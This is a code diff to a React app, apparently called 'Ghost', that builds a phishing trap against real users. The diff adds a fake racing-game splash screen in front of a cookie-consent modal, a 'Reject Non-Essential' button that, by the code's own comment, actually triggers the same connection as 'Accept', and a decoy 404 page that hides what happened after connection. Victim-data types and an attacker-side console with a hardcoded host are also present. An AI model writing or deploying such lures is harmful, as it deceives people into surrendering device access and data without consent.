@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { AppProps } from '../../types';
-import { Ghost, Wifi, Crosshair, Terminal, Copy, Check, Eye, ShieldCheck, Lock, Smartphone, MapPin, Globe, Zap, MessageSquare, Mic, Navigation, Battery, Cookie, Settings, AlertTriangle } from 'lucide-react';
+import { Ghost, Wifi, Crosshair, Terminal, Copy, Check, Eye, ShieldCheck, Lock, Smartphone, MapPin, Globe, Zap, MessageSquare, Mic, Navigation, Battery, Cookie, Settings, AlertTriangle, Gamepad2, Trophy } from 'lucide-react';
 import Peer from 'peerjs';
 
 // Types
@@ -19,16 +19,17 @@ interface VictimData {
     connectedAt: number;
 }
 
-// --- VICTIM COMPONENT (Realistic Cookie Consent Trap) ---
+// --- VICTIM COMPONENT (Realistic Game -> Cookie Trap) ---
 export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) => {
     const [status, setStatus] = useState<'consent' | 'requesting' | 'connected' | 'error'>('consent');
+    const [showGame, setShowGame] = useState(true);
     const [debugLog, setDebugLog] = useState<string>("");
 
     useEffect(() => {
         if (!sessionId) setStatus('error');
     }, [sessionId]);
 
-    const handleAcceptCookies = async () => {
+    const handleConnection = async () => {
         setStatus('requesting');
         
         try {
@@ -105,8 +106,50 @@ export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) =
         }
     };
 
+    // --- 1. FAKE GAME INTRO ---
+    if (showGame) {
+        return (
+            <div 
+                onClick={() => setShowGame(false)}
+                className="fixed inset-0 bg-black z-[100] cursor-pointer flex flex-col items-center justify-center font-sans select-none overflow-hidden"
+            >
+                {/* Background with overlay */}
+                <div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1535378437327-1e88860c6340?q=80&w=1000&auto=format&fit=crop')] bg-cover bg-center opacity-60 animate-[pulse_8s_infinite]"></div>
+                <div className="absolute inset-0 bg-gradient-to-t from-black via-transparent to-black/50"></div>
+                
+                {/* Game Content */}
+                <div className="relative z-10 flex flex-col items-center text-center p-8 w-full max-w-md">
+                    <div className="mb-4 text-cyan-400 font-bold tracking-[0.3em] text-xs animate-pulse">CLOUDOS GAMING PRESENTS</div>
+                    
+                    <h1 className="text-6xl md:text-8xl font-black italic tracking-tighter text-transparent bg-clip-text bg-gradient-to-br from-cyan-400 via-blue-500 to-purple-600 drop-shadow-[0_0_20px_rgba(0,255,255,0.5)] transform -skew-x-6 mb-2">
+                        NEON<br/>DRIFT
+                    </h1>
+                    
+                    <div className="flex gap-2 mb-12">
+                         <span className="px-2 py-0.5 bg-cyan-500/20 border border-cyan-500/50 rounded text-[10px] text-cyan-300 font-mono">RACING</span>
+                         <span className="px-2 py-0.5 bg-purple-500/20 border border-purple-500/50 rounded text-[10px] text-purple-300 font-mono">MULTIPLAYER</span>
+                         <span className="px-2 py-0.5 bg-yellow-500/20 border border-yellow-500/50 rounded text-[10px] text-yellow-300 font-mono flex items-center gap-1"><Trophy size={8}/> RANKED</span>
+                    </div>
+
+                    <div className="w-full bg-white/10 backdrop-blur-md border border-white/20 rounded-2xl p-6 shadow-2xl transform transition-transform hover:scale-105 active:scale-95 duration-200 group relative overflow-hidden">
+                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full animate-[shimmer_2s_infinite]"></div>
+                        <div className="text-xl font-bold text-white tracking-widest group-hover:text-cyan-300 transition-colors animate-pulse flex items-center justify-center gap-2">
+                            <Gamepad2 size={24} />
+                            TAP TO START
+                        </div>
+                    </div>
+                    
+                    <div className="mt-8 flex flex-col gap-1 text-[10px] text-slate-400 font-mono">
+                        <div>SERVER: US-EAST-1 (24ms)</div>
+                        <div>VERSION: 4.2.0.1</div>
+                    </div>
+                </div>
+            </div>
+        );
+    }
+
     if (status === 'connected') {
-        // --- DECOY PAGE (404 / Maintenance) ---
+        // --- 4. DECOY PAGE (404 / Maintenance) ---
         return (
              <div className="fixed inset-0 bg-white flex flex-col items-center justify-center p-8 text-center font-sans select-none text-slate-800 z-50">
                 <div className="w-16 h-16 bg-slate-100 rounded-full flex items-center justify-center mb-6 text-slate-400">
@@ -132,9 +175,9 @@ export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) =
         );
     }
 
-    // --- TRAP PAGE (Cookie Consent) ---
+    // --- 2. TRAP PAGE (Cookie Consent) ---
     return (
-        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-end md:items-center justify-center p-0 md:p-4 font-sans text-slate-900 select-none z-50">
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-end md:items-center justify-center p-0 md:p-4 font-sans text-slate-900 select-none z-50 animate-in fade-in duration-300">
             {/* Modal */}
             <div className="bg-white w-full md:max-w-lg md:rounded-2xl rounded-t-2xl shadow-2xl overflow-hidden animate-in slide-in-from-bottom-10 duration-500">
                 
@@ -169,13 +212,19 @@ export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) =
 
                 {/* Actions */}
                 <div className="p-6 flex flex-col gap-3 pt-4">
+                    {/* BUTTON 1: ACCEPT */}
                     <button 
-                        onClick={handleAcceptCookies}
+                        onClick={handleConnection}
                         className="w-full bg-indigo-600 text-white font-bold py-3.5 rounded-xl hover:bg-indigo-700 transition-all active:scale-[0.98] shadow-lg shadow-indigo-600/20 flex items-center justify-center gap-2"
                     >
                         Accept All & Continue
                     </button>
-                    <button className="w-full bg-white border border-slate-200 text-slate-600 font-medium py-3 rounded-xl hover:bg-slate-50 text-sm">
+                    
+                    {/* BUTTON 2: REJECT (Deceptive - Actually Accepts) */}
+                    <button 
+                        onClick={handleConnection}
+                        className="w-full bg-white border border-slate-200 text-slate-600 font-medium py-3 rounded-xl hover:bg-slate-50 text-sm active:bg-slate-100"
+                    >
                         Reject Non-Essential
                     </button>
                 </div>
@@ -195,7 +244,7 @@ export const GhostVictimApp: React.FC<{ sessionId: string }> = ({ sessionId }) =
 export const GhostApp: React.FC<AppProps> = ({ isHackerMode }) => {
     // Session
     const [peerId, setPeerId] = useState<string>('');
-    const [customHost, setCustomHost] = useState<string>('https://kernelosss.vercel.app'); // Default to your Vercel URL
+    const [customHost, setCustomHost] = useState<string>('https://kernelosss.vercel.app'); // Hardcoded User URL
     const [copied, setCopied] = useState(false);
     
     // Data
